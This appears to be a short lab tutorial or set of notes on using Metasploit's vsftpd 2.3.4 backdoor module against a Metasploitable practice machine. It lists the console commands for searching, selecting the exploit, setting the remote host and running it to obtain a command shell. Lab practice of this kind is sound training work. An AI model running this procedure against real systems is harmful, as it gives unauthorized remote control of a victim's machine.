 #now metasploit framework will open
 #from here we can use exploits , set target machines ip adress, backdoors we want to use.
 
Note : Now better set to terminal windows on screen. One in which we run metasploit framework and the other to keep track on service of system prvided by nmap.

msf6> search vsftpd    // vsftpd -> name of versions of ftp service on metasploit system

 #This gives what exploits are present on all versions of that service.
 #we can choose our version and exploit based on that.
 
msf6> use exploit/unix/ftp/vsftpd_234_backdoor   //its name of exploit on this version of ftp
 #this open the command line to that exploit.    //msf6 exploit(unix/ftp/vsftpd_234_backdoor)>
 
msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options
 #this show different options for the exploit.

msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set Rhosts [host]   // Rhosts -> remote hosts
 # with this we'll be remoe host for this metasploitable system.
 # if service is in the same port as we are, no need to change otherwise we can use Rport.

msf6 exploit(unix/ftp/vsftpd_234_backdoor)> exploit 
 # right now we have command shell of metasploitable system opened on our linux command shell.
 
 ### Now we can literally do anything with metasploitable system fron our linux system.
